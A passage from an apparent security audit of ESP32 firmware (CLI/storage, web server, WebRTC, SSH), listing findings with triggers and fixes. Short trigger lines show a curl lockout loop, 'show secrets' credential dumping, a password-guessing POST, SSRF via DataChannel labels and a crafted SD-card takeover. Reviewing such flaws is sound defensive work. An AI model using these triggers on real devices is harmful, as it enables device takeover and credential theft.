**Fix:** In `cliTcpConnect`, treat any non-`cli_connect_t` descriptor (net's) as `loginRequired = authEnabled()` — the gate is already implemented (`cliHandleLoginInput`), it just is not applied. Alternatively have net send a `cli_connect_t{CLI_LINE, 0, CLI_NO_COLOR, 0, login=1}`. Consider the same for `LOG_PORT_TCP` (a log-side password gate or refusing when auth is enabled).

### [High] `show` (and `show secrets`) prints `secrets.*` — admin hash, WireGuard keys, and live session cookies — to any CLI channel
**Where:** esp-idf/src/storage.cpp:3054-3124 (`cmdShow`), 2988-2996 (`storageList`), 396-405 (`walkTreeCollect`); esp-idf/src/auth.cpp:137-167 (cookies stored as plaintext under `secrets.auth.cookies.N.cookie`).
**Attacker:** (2) authenticated web/CLI user, (3) USB reach (framed RPC runs with `login=0`, cli.cpp:2252-2254; serial console session with `login=0`, cli.cpp:2186), (1) via finding 1.
**Issue:** `isSecret()` gates only the browser mirror (`dcBuildDumpInto`, `dcAccumulateChange`, `mergeIncomingPatch`). The CLI `show` verb walks `cfgRoot` verbatim with no secrets filter, and `set` writes `secrets.*` freely (`setConfigVar` only rejects `fw.*`). The auth doc says "`secrets.auth.*` never leaves the device"; via the CLI it does, and the session cookies are bearer tokens for 60 days.
**Trigger:** Any CLI: `show secrets` → `secrets.auth.cookies.0.cookie = <32 hex>`, `secrets.auth.realms.0.hash = <salt:hash>`, `secrets.wg.*`. Or `set secrets.auth.enable=0` to switch off enforcement for web/ssh. Over USB, the framed RPC (`F5 53 47 01 <id> <len> "show secrets"`) returns it with no session at all.
**Impact:** Any CLI reach (browser terminal, USB cable, framed RPC from a flasher host, TCP if enabled) yields every other user's live session token and all stored secrets; `secrets.auth.enable=0` removes the web/ssh password gate. There is effectively no privilege boundary between "CLI user" and "owner of all secrets".
**Fix:** Filter `secrets.*` in `cmdShow`/`storageList` (print `<hidden>`), and reject `set`/`unset` of `secrets.*` from the CLI except through the auth verbs; at minimum never print `secrets.auth.cookies`. If the console is meant to be fully trusted, say so in auth.md and drop the "never leaves the device" claim.

### [Medium] Boot-script and cron command lines are logged verbatim, so passwords typed there land in the log ring, the browser log view, the SD log file, and TCP 8080
**Where:** esp-idf/src/cli.cpp:595 and 617 (`cliRunFile` logs each line with `info("cli: %s")`), esp-idf/src/cron.cpp:320 (`info("%02d:%02d %s", …, p.cmd)`) and 452 (`cronDrainCommands` `info("cli: %s")`), esp-idf/src/log.cpp:198-215 (log file), 640-644 (console echo).
**Attacker:** (2) authenticated web user reading the log view; (4) anyone reading the SD card log file later; (1) via `s.net.log_port`.
**Issue:** A `/state/boot` line like `auth passwd admin hunter2` or a cron entry carrying a password/key argument is echoed in cleartext into the log, which is mirrored to the browser (`log:1`), appended to `/sdcard/log/YYYYMMDD.log` and is pasted back to every new log client (`logPasteBack`).
**Trigger:** Put `auth passwd admin hunter2` (or any straddle command carrying a secret, e.g. a WiFi or WireGuard key) in `/state/boot` or `s.cron.tab.*`; reboot; open the browser log, or read the SD card.
**Impact:** Secret disclosure to anyone with log access or the SD card, persisting across boots.
**Fix:** Redact known secret-carrying verbs before logging (`auth passwd`, `passwd`, `set secrets.`), or log only the command's first word for boot-script/cron lines.

### [Medium] Global login rate limiter lets one remote client lock everyone out of login indefinitely
**Where:** esp-idf/src/auth.cpp:172-182 (`isRateLimited`), 417 and 442-445 (`authLogin`).
**Attacker:** (1) unauthenticated on LAN/internet against the web login endpoint (spangap-web's `/auth/login` calls `authLogin`; the CLI login gate too).
**Issue:** `failCount` and `lastFailMs` are a single global pair. `failCount` only resets on a successful login, and the window is `min(2^(failCount-1), 300) s` from the *last* failure. An attacker who sends one wrong password every <5 minutes keeps the device permanently in `AUTH_RATE_LIMITED` for the legitimate user — and each of the attacker's probes also "counts" as a failure, so the window never expires.
**Trigger:** `while true; curl -d 'password=x' https://device/auth/login; sleep 200; done`.
**Impact:** Persistent denial of login (web, ssh, and CLI login gate) for the owner; no cost to the attacker. The rate limiter's log line (`login failed (attempt N)`) is the only trace.
**Fix:** Key the backoff per source address (net supplies `clientAddr`) or cap the lockout and decay `failCount` with time; never let a failure *during* the limited window extend it.

### [Medium] A restore archive or SD card can carry a crafted `.db.gz` whose text-field lengths are not validated → out-of-bounds reads in PSRAM
**Where:** esp-idf/src/storage_db.cpp:314-332 (`rebuildIndex` validates only `rec_len` and `keyLen`), 342-354 (`readRecordText` trusts every `u16 len` of every text field with no check against `rec_len`/`used`), 831-835 (`sdbGetField` → `readRecordText`).
**Attacker:** (2) authenticated web user uploading a backup archive (safe-mode restore writes `lxmf/msgs/*.db.gz` etc. straight onto the store), (4) SD-backed state store edited offline.
**Issue:** `rebuildIndex` accepts a record whose text-field length prefixes point past the end of the record and past `s->used`; `readRecordText` then `assign()`s from beyond the block. Reads run on the PSRAM heap until the requested length is satisfied — up to 64 KB per field — and the result is handed to the browser mirror (`sdbGetLocked` → `dcResolveKey` → patch) or the CLI.
**Trigger:** Restore an archive containing `lxmf/contacts/0.db.gz` with a valid header, one record whose first text field's `u16 len = 0xFFFF`, `rec_len` covering only the header+key. Open the contacts view.
**Impact:** Heap over-read (information leak of adjacent PSRAM — other users' message bodies, config, keys — into the browser), or a fault if the read crosses the end of the PSRAM map.
**Fix:** In `rebuildIndex`, walk every text field and require `hs + 2 + klen + Σ(2 + len_i) <= rlen`; reject the store on violation (the "bad records" path already exists).

### [Medium] Inserting a prepared SD card silently replaces the device's whole state store at next boot
**Where:** esp-idf/src/fs.cpp:1149-1152 (`fsSelectStateStore`: SD wins iff `/sdcard/state` is a directory), 1189-1205 (empty store → factory seed), esp-idf/src/spangap_init.cpp:689-690 (boot script from the active store), esp-idf/src/storage.cpp:2104-2158 (externals loaded by filename stem, including `secrets.*`).
**Attacker:** (4) anyone within reach of the SD slot; no credential.
**Issue:** The store location is decided purely by the presence of a directory on removable media. An attacker's card with `/state/storage/root.json` (`secrets.auth.enable=0`, their WiFi, a `boot` script running any CLI command) becomes the device's identity, config and secrets on the next power cycle; `/state` on flash is left intact but unused, so the original secrets are also still readable if they later pull the flash. Conversely, when the operator legitimately runs from SD, every secret (admin hash, cookies, WireGuard/TLS keys) sits in cleartext gzip JSON on the card.
**Trigger:** Prepare a FAT card with `/state/storage/root.json` = `{"secrets":{"auth":{"enable":0}}}` and `/state/boot` = `set s.net.cli_port=8081`; insert; reboot.
**Impact:** Full takeover with physical access to the slot only (much lower bar than a flash dump); persistent backdoor that survives `format flash`.
**Fix:** Require an explicit persisted opt-in on flash (`s.sys.state_on_sd=1` in the flash store) before honouring `/sdcard/state`, or bind the SD store to the device (a marker file containing the eFuse MAC, checked at select time). Document that an SD-backed store is cleartext.

### [Low] Sessions minted before the clock is valid never expire
**Where:** esp-idf/src/auth.cpp:431-434 (`expires = tv.tv_sec + COOKIE_EXPIRY_S`), 343-351 (`authInit` sweep requires `exp > 1700000000`), 483 (`authCheck` same guard).
**Attacker:** (2) holder of a cookie obtained while the clock read 1970 (offline node, boot before NTP, `s.sys.time_wait_s=0`).
**Issue:** With an invalid clock `expires` is ~5.2 M (1970 + 60 days). Both expiry checks deliberately skip entries whose `expires <= 1700000000`, so such a cookie is treated as immortal — it is never swept and never rejected, even after the clock becomes valid. Up to 16 such tokens persist in `secrets.auth.cookies`, and they survive reboots.
**Trigger:** Log in on an offline device (or during the pre-NTP window); keep the cookie.
**Impact:** A token that should die after 60 days is valid forever; combined with finding 2 it is also readable from any CLI.
**Fix:** When the clock is invalid, store `expires = 0` and have `authCheck` treat 0 as "expires 60 days after the clock first becomes valid" (rewrite it on first valid-clock check), or refuse to mint cookies until `sys.time.valid`.

### [Low] Password hash and cookie comparisons are not constant-time
**Where:** esp-idf/src/auth.cpp:80 (`computed == stored`), 455 and 476 (`strcmp(stored, cookie)`).
**Attacker:** (1)/(2) network attacker measuring response time.
**Issue:** `std::string ==` short-circuits on the first differing byte; `strcmp` likewise. The cookie table is linear-scanned with `strcmp` per entry, so timing leaks how many leading bytes of a guessed cookie match.
**Trigger:** Repeated `/auth/*` requests with candidate cookies, timing the reply (noisy on WiFi; the hash compare additionally sits behind SHA-256 so is far weaker as an oracle).
**Impact:** Theoretical; 128-bit tokens are impractical to brute-force even with a per-byte oracle, but it costs nothing to fix.
**Fix:** Compare with a fixed-length constant-time loop (`mbedtls_ct_memcmp` or a volatile XOR-accumulate) for both hash and cookie.

### [Low] `cliCollapseAbsolute` silently truncates paths between 256 and 319 bytes, so a long path operates on a different, shorter path
**Where:** esp-idf/src/cli.cpp:219-256 (`work[256]` via `safeStrncpy`, but `cap` is the caller's 320), 307-324 (`cliResolveFsPath` passes a 320-byte buffer).
**Attacker:** (2) CLI user, or a boot script / cron entry with a long path.
**Issue:** `safeStrncpy(work, path, 256)` truncates a 256-319 byte input; the collapsed, truncated path is then written back and used by `rm -r`, `mv`, `cp`, `cat`. `rm -r /sdcard/<250 chars>/keep-me` can resolve to `/sdcard/<250 chars>` and delete the parent.
**Trigger:** `rm -r /sdcard/AAAA…(250)/x`.
**Impact:** Wrong-target filesystem operation (data loss); no memory corruption.
**Fix:** Return false when `inLen >= sizeof(work)`.

### [Low] `cliRunFile` stops executing the script after any line longer than 127 bytes; `cronDrainCommands` truncates commands at 127 bytes
**Where:** esp-idf/src/cli.cpp:579-624 (`buf[128]`; once `linePos == 127` the next `fs_read` asks for 0 bytes, the partial line is executed and the loop breaks — the rest of the file is never read), esp-idf/src/cron.cpp:443-458 (`buf[128]`, bytes beyond 127 dropped until the newline).
**Attacker:** (2) whoever edits `/state/boot` or `s.cron.tab.*` (including a legitimate operator by accident).
**Issue:** A long `set s.x=<value>` line (URLs, keys, base64) is silently cut and, in the boot-script case, every following line is skipped — a hardening line after it (e.g. `set s.net.cli_port=0`) never runs.
**Trigger:** 130-character line in `/state/boot`.
**Impact:** Silent partial execution; truncated values written to config.
**Fix:** Grow the buffers or make the line reader dynamic (`std::string`), and reject/log an over-long line instead of executing its prefix.

### [Info] Framed RPC and the serial console run every command with `login=0`
**Where:** esp-idf/src/cli.cpp:2186 (`cli_connect_t req = { CLI_ANSI, 1, CLI_COLOR, 0, /*login*/0 }`), 2252-2254 (`rpcRun` `login=0`).
**Attacker:** (3) anyone with the USB cable.
**Issue:** Documented and deliberate (framed-rpc.md: "The peer on the serial console can already type `reset factory`"). Noted because with finding 2 a USB peer can lift every live web session cookie (`show secrets.auth.cookies`) without disturbing the log or any interactive session — a flasher host, or a malicious USB device the board is plugged into, gets silent network-credential theft rather than only local control.
**Fix:** If the console is to stay unauthenticated, apply the secrets filter of finding 2; otherwise make the serial/RPC `login` follow `authEnabled()` with a way to reset from the ROM bootloader.

### [Info] `s.cron.tab.*` and `s.cli.aliases.*` turn any config write into command execution
**Where:** esp-idf/src/cron.cpp:316-321, esp-idf/src/cli.cpp:1045-1066 (alias expansion), esp-idf/src/storage.cpp:3669-3694 (browser patch writes any non-secret key).
**Attacker:** (2) authenticated browser user via the storage DataChannel (no terminal needed).
**Issue:** By design ("no new credential, the write is the request"). It means the storage DataChannel is a full command-execution surface: `{"s":{"cron":{"tab":{"x":"* * * * * - show secrets"}}}}` runs within a minute and the output goes to the log view (finding 3). Any future "read-only" or second realm would have to block these keys.
**Fix:** No change if a single admin realm is the model; document that `s.cron.tab.*`, `s.cli.aliases.*`, `s.cli.start_dir`, `s.log.dir` and `/state/boot` are code-execution-equivalent, and keep them out of any lesser realm.

### [Info] `s.sys.project` mismatch formats `/state` without random overwrite
**Where:** esp-idf/src/spangap_init.cpp:609-624 (`esp_littlefs_format("state")` then restart).
**Attacker:** n/a (data-hygiene note).
**Issue:** safe-mode.md argues a format leaves every secret recoverable from a flash dump and that factory reset therefore overwrites with random bytes; the project-mismatch path (flashing a different spangap project) still uses a plain format, so secrets from the previous project survive on flash.
**Fix:** Route this path through the same `s.sys.factory_reset` flag so the wipe task handles it.

## Positive notes (things done right, briefly)

- targz reader (`targz.cpp`): rejects absolute paths, `..`, empty components, every typeflag except file/directory, over-long names; header checksum verified; footer identified by position with CRC32/ISIZE check; gzip header fields parsed byte-wise with bounded state. No zip-slip found.
- Framed RPC sniffer: length-prefixed, allocation bounded to the 2-byte length with a discard state when the allocation fails, 1 s assembly timeout, 5 s exec bound, id constrained on the host side; frames cannot open a serial-handler session mid-frame.
- Line editor and LINE-mode buffers are `std::string` with 4096-byte caps; escape parser consumes CSI/SS3 sequences whole; `cliReadLine` strips escapes and bracketed paste for password entry and zeroes password buffers.
- CLI login gate (`cliHandleLoginInput`) is server-side, discards pipelined bytes after the password line, three tries then close.
- Browser mirror: `secrets.*` stripped from dump, per-key patches and inbound merges; `fw.*` and `storage.db.*` read-only; `{"fetch"}` only routes to registered structured-DB stores.
- Password hashing uses a 16-byte `esp_random()` salt; session tokens are 128-bit from `esp_random()`; nothing logs hashes or tokens (login logs realm only).
- `gzInflate` caps ISIZE at 8 MB and verifies CRC; spanfs validates every index entry, path NUL-termination and CRC at open so lookups need no range checks.
- fs worker tripwire refuses bogus request pointers; FAT rename made overwrite-correct so atomic `<file>.new` + rename holds on SD.
- Safe-mode restore formats first, writes `.restore-active`, and any interrupted restore lands in a clean factory store; factory reset overwrites the whole region with random bytes low-to-high.
- Log sanitiser folds C0 controls so attacker-influenced storage values cannot drive the operator's terminal; `logSafe()` applied to notify-drop lines.
- Cron parser bounds every field (32-byte fields, 16-byte base, iterative comma lists).

---

# spangap-web (firmware)

Pre-release security review of the firmware half of `spangap-web`. Read-only.
All findings traced to the actual code path.

## Coverage

Fully read and traced:
- `esp-idf/src/web.cpp` (2434 lines) — request parse, routing/URL-forwarding,
  file serving, path-traversal guards, WebDAV verbs, auth enforcement, HTTPS
  redirect + loopback exemption, the `web.h` helper API (`webGetHeader`,
  `webReadBody`, `webHeaderField`, `webExtractCookie`, `wsReadFrame`, …).
- `esp-idf/src/auth_web.cpp` — `/auth/login|passwd|logout` JSON face.
- `esp-idf/src/safe_mode.cpp` (1032 lines) — recovery page, `/backup` endpoint,
  restore/backup streaming, tar hardening, auth gate.
- `esp-idf/src/webrtc_task.cpp` (1390) — signaling WS auth/session, ICE-lite/STUN,
  DTLS setup, UDP path, DC→ITS router.
- `esp-idf/src/webrtc_sctp.cpp` (1313) — SCTP chunk parse, cookie, DCEP,
  reassembly, rexmit/reorder pools.
- `esp-idf/include/web.h`, `webrtc_sctp.h`, `webrtc_task.h`.
- Cross-straddle USE of the primitives the router/gate reach: spangap-core
  `auth.cpp` (`authPasswd`/`authLogin`/rate-limit), `cli.cpp` (DC connect
  `authed=true`), `fs.cpp` (FS_STREAM/FS_READ ports), spangap-net `net.cpp`
  (`NET_PORT_TCP_DIAL` dial-on-behalf), and the browser cookie set in
  `browser/src/lib/auth.ts`.

Not reached / out of scope: the mbedTLS **HTTPS/TLS** server config, cert & key
storage/permissions, ALPN (owned by spangap-net — noted where it bears on
findings); the browser TypeScript (colleague); acme `.well-known` handler and
seccam's rtsp/rec web registrations were only characterised, not audited; the
spangap-core auth/cli/fs internals are a colleague's review — I reviewed their
USE from here.

## Findings

### [High] Unauthenticated, un-rate-limited admin-password brute force via `POST /auth/passwd`
**Where:** `spangap-web/esp-idf/src/auth_web.cpp:63-82,95-112` (`authHandlePasswd`,
`authUrlHandler`); `spangap-core/esp-idf/src/auth.cpp:371-393` (`authPasswd`) vs
`:415-417` (`authLogin` — the only caller of `isRateLimited()`).
**Attacker:** unauthenticated on the LAN, or the internet if port 80/443 is
exposed via the upnp/duckdns straddles.
**Issue:** `authUrlHandler` dispatches `auth/passwd` with **no session/realm
check**. `authPasswd(realm, old, new)` verifies the current password with
`verifyPassword(old, hash)` and returns `AUTH_WRONG_PASSWORD` (2) on mismatch,
`AUTH_OK` (0) on match — a clean online oracle. Unlike `authLogin`, `authPasswd`
never calls `isRateLimited()`, so the global exponential backoff that protects
`/auth/login` does not apply. Setting `new` equal to the guessed `old` makes a
correct guess non-destructive (same-realm uniqueness scan skips the realm
itself, `authPasswd` then re-hashes the same password), so the attacker can
probe silently.
**Trigger:** repeat `POST /auth/passwd` `{"realm":"admin","old":"<guess>","new":"<guess>"}`;
result `2` = wrong, `0` = correct. No throttle → guesses limited only by HTTP
round-trip (hundreds/sec on a LAN).
**Impact:** defeats the sole credential protecting `/state`, `/fixed`, `/sdcard`,
the WebRTC session, and (below) the whole internal ITS surface. The `/auth/login`
rate limiter is bypassed entirely.
**Fix:** call `isRateLimited()` / bump the failure counter inside `authPasswd`
(or in `authHandlePasswd`) exactly as `authLogin` does; and require an
authenticated admin session for `auth/passwd` except the unset→set onboarding
case (see next finding).

### [High] WebRTC DataChannel→ITS router is an unrestricted gateway to every internal service, gated only by an any-realm cookie
**Where:** `webrtc_task.cpp:707-793` (`webrtcDcOpen`: split `"task:port"`,
`itsConnect(taskName, port, protocolBytes)`, **no allowlist**); auth gate at
`:867-878` (`authCheck(cookie).empty()` — accepts *any* realm, not `admin`).
Reachable targets confirmed: `spangap-net/.../net.cpp:1659,590-660`
(`NET_PORT_TCP_DIAL` = dial-on-behalf, host:port from the connect payload);
`spangap-core/.../fs.cpp:788-796` (`FS_STREAM_PORT`=2 / `FS_READ_PORT`=3, raw
file read/write); `spangap-core/.../cli.cpp:1305-1308` (`cliDcConnect` sets
`cl.authed = true` unconditionally — full admin CLI, incl. `show secrets` which
prints password hashes and live session cookies); storage config-write channel.
**Attacker:** (2) any authenticated browser user — including a holder of a
**non-admin** realm cookie; (3) any page that has obtained/stolen a session
cookie.
**Issue:** the label is parsed to an arbitrary `task:port` and connected with no
allowlist, so a browser DataChannel can address *any* ITS server port, not just
`storage/log/cli`. The only gate is the signaling-WS check, which requires the
cookie to resolve to *some* realm — while the file mappings require the specific
`admin` realm (`web.cpp:1546`). Result: (a) realm inconsistency — a `view`-class
session (if any non-admin realm exists) gets a full admin CLI, config write, and
arbitrary file access it is denied over HTTP; (b) even for the intended admin,
label `"net:2"` + DCEP protocol string `"10.0.0.5:22"` turns the device into an
arbitrary outbound TCP proxy (SSRF / LAN pivot / port scan behind the device),
and `"fs:2"`/`"fs:3"` bypass `web`'s path-traversal and mapping-auth checks
entirely.
**Trigger:** open a WebRTC session with a valid cookie, then
`pc.createDataChannel("net:2", {protocol:"victim-host:port"})` (SSRF), or
`"fs:3"` / `"cli:1"`.
**Impact:** full device compromise and a LAN pivot from any valid session; a
privilege jump from any non-admin realm to admin. `cli:1`→`show secrets` also
discloses every live session cookie and password hash.
**Fix:** enforce the `admin` realm in `webrtcItsConnect` (match `web.cpp`'s
mapping check), and gate `webrtcDcOpen` on an allowlist of task:port labels the
browser is actually meant to reach (`storage:1`, `log:1`, `cli:1`, the app's own
ports) rather than connecting to any name it is handed.

### [Medium] Unauthenticated WebRTC session DoS via unfiltered `peerAddr` overwrite
**Where:** `webrtc_task.cpp:1008-1015` (`handleUdpPacket`: `peerAddr = *from;
peerKnown = true;` for **every** inbound datagram, before any auth/DTLS state
check); send path `:376-395` (`webrtcBioSend` sends to `peerAddr`).
**Attacker:** (1) unauthenticated, anyone who can reach the WebRTC UDP port
(`s.net.webrtc_port`, default 4433 on `INADDR_ANY`) — internet-reachable if upnp
maps it.
**Issue:** the device keeps one global `peerAddr` and rewrites it from the source
of any UDP packet (STUN handled pre-DTLS at `:1017`, or anything else). During an
active authenticated session, a stray/attacker datagram repoints DTLS output at
the attacker; the real browser's next packet repoints it back, so a steady flood
keeps the association flapping.
**Trigger:** send UDP (even a 20-byte STUN binding request or random bytes) to
port 4433 while a session is live; repeat to sustain.
**Impact:** denial of the WebRTC data path (config sync, CLI, log, live media) for
the legitimate user. No crypto is broken (attacker packets fail
`bad_record_mac`), but the address clobber is enough to disrupt.
**Fix:** once a session is established and DTLS-connected, ignore datagrams whose
source ≠ the established peer (or only update `peerAddr` on a record that
authenticates), rather than on every packet.

### [Medium] Fresh-device admin takeover: unauthenticated password-set on an unprovisioned node
**Where:** `auth_web.cpp:95-112` (no auth on `auth/passwd`);
`spangap-core/.../auth.cpp:383-386` (`unset` branch: `old==""` + non-empty `new`
→ sets the password).
**Attacker:** (1) unauthenticated on the LAN, during the window before the owner
sets a password.
**Issue:** when the `admin` hash is unset (factory state), `POST /auth/passwd`
`{"realm":"admin","old":"","new":"..."}` sets it with no prior authentication —
first writer wins. (A cross-origin malicious page is blocked here by the JSON
content-type CORS preflight, which the device answers 405 with no CORS headers;
the exposure is a party that can reach the device directly.)
**Trigger:** one unauthenticated POST on a device whose admin password is still
unset.
**Impact:** an attacker on the same network claims the device before its owner,
locking the owner out (recovery then needs physical/safe-mode factory reset).
**Fix:** bind first-password onboarding to a proof of local/physical presence
(e.g. the human-presence signal, SoftAP-only, or a boot-time claim window),
rather than accepting it from any network peer.

### [Medium] `/state` file/WebDAV mapping exposes and can overwrite secrets, contradicting the "secrets never leave the device" invariant
**Where:** `web.cpp:2122-2123` (`/state`→`/state`, `index=1 dav=1 auth="admin"`);
serving path `:1730-1765`; WebDAV PUT/DELETE/MOVE `:1652-1705`. Secrets live under
`secrets.auth.*` persisted as files in the state store
(`spangap-core/docs/auth.md`, `auth-internals.md §1`).
**Attacker:** (2) any `admin`-realm browser session (and see the two High findings
for how a session is reached).
**Issue:** the documented guarantee is that `secrets.*` are excluded from the
browser config mirror and "never leave the device". But the `/state` mapping
serves the raw persisted store as files and directory listings, so a `GET` of the
auth store file returns the salted password hashes **and every live session
token** (`secrets.auth.cookies.<N>.cookie`); WebDAV PUT/DELETE on the same
mapping can rewrite them. `/fixed` (dav=1) similarly allows writing the SPA
webroot and factory-state if that partition is mounted writable.
**Trigger:** `GET /state/<auth-store-file>` (or `PROPFIND`/browse), or `PUT` over
it, from an admin session.
**Impact:** disclosure of live session cookies (session theft → persistent access
that survives a password change until the token expires, 60 days) and password
hashes (offline cracking of the fast SHA-256(salt‖pw)); config tamper. It is
admin-gated, but the invariant that protects the config channel is silently
broken by the file channel.
**Fix:** exclude the `secrets.*`-backing store file(s) from what the `/state`
mapping serves and accepts (deny-list in `findMapping`/`urlToFsPath`), or move
secrets to a store not covered by any web mapping.

### [Low] Open redirect via attacker-controlled `Host` in the HTTP→HTTPS 301
**Where:** `web.cpp:1433-1447` (`Host` header copied verbatim into
`Location: https://<host><target>`); `serve301` `:1218-1226`.
**Attacker:** (3) a malicious link / (1) any client on the plain-HTTP port.
**Issue:** the redirect target host is taken from the request `Host` header with
no validation against the device's own names. CRLF injection is prevented
(`webHeaderField` stops at CR/LF), so this is an open redirect, not header
injection.
**Trigger:** `GET http://device/path` with `Host: evil.example`.
**Impact:** the device's plain-HTTP endpoint 301-redirects victims to an
attacker-chosen origin (phishing aid). Low on its own.
**Fix:** redirect using a configured hostname / the connection's local address,
not the client `Host`.

### [Low] Unauthenticated STUN reflection/amplification and liveness oracle on the WebRTC UDP port
**Where:** `webrtc_task.cpp:1017-1020` (`isStunPacket`→`handleStunRequest` runs
*before* the `if (!dtlsSessionActive) return;` at `:1021`); `:471-521`.
**Attacker:** (1) unauthenticated, reachable on port 4433 (internet if upnp-mapped).
**Issue:** any well-formed STUN binding request (≥20 bytes, magic cookie) gets a
signed binding-response (~64 bytes) regardless of session state, with no ICE
credential check on the request. Small (~3×) amplification and a clear "device is
here" oracle.
**Trigger:** send a STUN binding request to the UDP port.
**Impact:** minor reflection/amplification and host discovery.
**Fix:** only answer STUN while a signaling session is active, or ignore requests
whose USERNAME/MESSAGE-INTEGRITY don't match the current session ufrag.

### [Low] `buildHeartbeatAck` writes into the fixed SCTP out buffer with no size check
**Where:** `webrtc_sctp.cpp:263-271` (`memcpy(out+pos+1, hbChunk+1, hbLen-1)`,
`pos += pad4(hbLen)`, no `outSize` param); caller `:981-985`; out buffer is
`sctpBuf[2048]` (`webrtc_task.cpp:156`), plaintext bounded by `plainBuf[2048]`.
**Attacker:** (2) an authenticated peer inside a live DTLS+SCTP session.
**Issue:** the HEARTBEAT is echoed into `outBuf` sized only from the inbound chunk
length, with no bound against `outBufSize`. It is **not reachable today** because a
single UDP datagram is capped at the 1500-byte `rxBuf`, so a HEARTBEAT chunk
cannot approach 2048; but the invariant is undocumented and one MTU/record-size
change away from an out-of-bounds write into adjacent PSRAM (`sctp` state).
**Trigger:** would require a HEARTBEAT chunk near 2 KB (not currently deliverable).
**Impact:** latent heap/PSRAM overwrite; none today.
**Fix:** pass `outSize` and clamp the echoed payload, as the other builders do.

### [Info] Non-constant-time secret comparisons; SCTP cookie timestamp unauthenticated
**Where:** `spangap-core/.../auth.cpp` `verifyPassword` (plain `std::string ==`,
documented in `auth-internals.md §5`) and `authCheck` cookie scan;
`webrtc_sctp.cpp:102-118` (`cookieCompute` HMACs 52 bytes, omitting the
`timestamp` field; `cookieVerify` `memcmp` 32).
**Issue:** password/cookie compares are not constant-time (network-timing attack
impractical over WiFi on a 32-hex token, so informational). The SCTP state cookie
does not authenticate or check its own timestamp, so a captured COOKIE-ECHO is
replayable for the life of the per-session `cookieSecret` — bounded because
`cookieSecret` is re-randomised on each `sctpInit`.
**Fix:** none required now; if hardened, use `mbedtls_ct_memcmp` for the cookie
and a constant-time compare for the password hash, and fold the timestamp into
the HMAC with an expiry check.

## Positive notes

- **Path traversal is handled and the request line is never URL-decoded**, so
  `%2e%2e`/`%2f` stay literal and cannot forge `..` or separators
  (`extractPath` `:825`, `hasPathTraversal` `:274`, `hasHiddenComponent` `:287`);
  the Destination header for MOVE/COPY re-checks via `urlToFsPath` `:447`. Hidden
  components (leading `.`) are additionally rejected.
- **The loopback exemption is not reachable from the network.** `clientAddr` is
  set only from `net`'s accepted-socket peer (`net.cpp:378`), a real TCP
  handshake from 127.0.0.1 cannot be spoofed off-box, and the only on-device
  loopback originator is the LCD viewer (`viewer/.../viewer_lcd.cpp:486`).
  *Caution for the future:* both the HTTPS-redirect and the realm bypass trust
  `ip_addr_isloopback(clientAddr)` unconditionally — any later component that
  terminates a forwarded/relayed request and re-originates it from 127.0.0.1
  (a local reverse proxy, a relay bridge) would inherit full unauthenticated
  access to `/state`, `/fixed`, `/sdcard`. Keep that invariant explicit.
- **Safe mode genuinely narrows the surface:** the mapping table is not loaded
  and routing short-circuits ahead of `findMapping` (`web.cpp:1514-1535`), the
  `/backup` endpoint only exists in the mode that needs it and 404s the wrong
  verb (`safe_mode.cpp:960-994`), and the restore tar reader is documented to
  reject `..`/absolute/over-long/non-regular entries.
- **The signaling-WS auth check is always first**, so `?force=1` cannot be
  evaluated without a valid cookie (`webrtc_task.cpp:865-907`); DTLS never
  initialises until an authenticated offer is processed, so the whole UDP/SCTP
  surface sits behind that gate (the reflection/DoS notes above are the
  exceptions).
- **SCTP chunk parsing is carefully bounded** — every chunk/parameter walk checks
  `len<hdr || off+len>pktLen` before reading, DCEP label/protocol copies are
  length-checked against their fixed buffers, and inbound reassembly is capped at
  256 KB matching the advertised `max-message-size` (`webrtc_sctp.cpp:800-840,
  352-404, 408-464, 649-712`). `wsReadFrame` rejects 64-bit length frames and
  bounds payload to the caller buffer (`web.cpp:2390-2434`).
- **`appendf`** deliberately clamps `pos` so a truncated `snprintf` can't
  underflow `bufSz-pos` and smash the heap (`web.cpp:345-367`), and `freeGenBuf`
  range-checks the pointer before `heap_caps_free` to avoid a corruption-induced
  device-wide panic (`:590-599`).
- DTLS is 1.2, single AEAD ciphersuite (ECDHE-ECDSA-CHACHA20-POLY1305),
  renegotiation disabled, HelloVerify cookie DoS protection on; `VERIFY_NONE` is
  correct here because the browser authenticates the channel by the SDP
  fingerprint carried over the already-auth-gated signaling WS
  (`webrtc_task.cpp:525-560`).
- Backup filename host field is sanitised before it reaches Content-Disposition
  and the page HTML (`safe_mode.cpp:189-192`).

---

# sshd

Pre-release security review of the `sshd` straddle (`/home/spangap/reticulous/sshd`):
a from-scratch SSH-2 server and outbound client on mbedTLS, vendored Ed25519
(orlp) and ML-KEM-768 (mlkem-native). Read-only review; no builds run.

## Coverage

Read in full: `README.md`, `INTERNALS.md`, `straddle.yaml`, `esp-idf/CMakeLists.txt`,
`include/sshd.h`, `src/sshd_wire.h`, `src/sshd_crypto.{h,cpp}`,
`src/sshd_session.{h,cpp}`, `src/sshd.cpp`, `src/ssh_client.{h,cpp}`.
Vendored crypto checked at the version/known-issue/glue level only (per brief):
`orlp_ed25519/{verify,sign,keypair}.c` + `ed25519.h`, `mlkem_native/VENDORED.md`
+ config. Cross-checked into other straddles for the trust boundaries the sshd
session reaches: spangap-core `auth.cpp` (`authLogin`, rate limiter), `cli.cpp`
(the login gate `cli_connect_t.login`), `storage.cpp` (`secrets.*` handling,
`show`/`storageList`), `its.cpp` (conn table, `itsDisconnect`, drain),
spangap-net `net.cpp` (TCP keepalive/backlog, public-facing ports) and `upnp.cpp`
(auto port-forward of public listeners). mbedTLS 3.6.5 `ecp.c` Curve25519
pubkey/normalise path inspected for low-order handling.

NOT covered: no dynamic testing/fuzzing (static only); the vendored Ed25519 and
ML-KEM field/group arithmetic were not re-audited line by line (brief); the exact
boot-time ordering of `SshdService::onInit` vs. the RF entropy source could not be
pinned to a cycle (affects the entropy note below); mbedTLS ChaCha20/Poly1305 and
SHA-256 primitives trusted as-is.

## Findings

### [Critical] Integer overflow in the wire length-bounds check → pre-auth remote OOB read / crash
**Status: fixed 2026-09-09.** `need()` now checks `n > v.n - v.pos` instead of `v.pos + n > v.n`; host-tested with a `0xFFFFFFFF` length.
**Where:** `esp-idf/src/sshd_wire.h:70-73` (`need`), reached from
`sshd_session.cpp:704-817` (`handle_userauth_request`), and every other
`get_string` caller; identical code in `ssh_client.cpp` via the shared header.
**Attacker:** (1) unauthenticated peer that has completed KEX (the server signs
and the client never has to prove anything to reach the AUTH phase); also (2) a
malicious/MITM server against the client.
**Issue:** `need()` guards with `if (v.pos + n > v.n)`. On the esp32s3 target
`size_t` is 32-bit. `n` is an attacker-supplied `uint32` string length read by
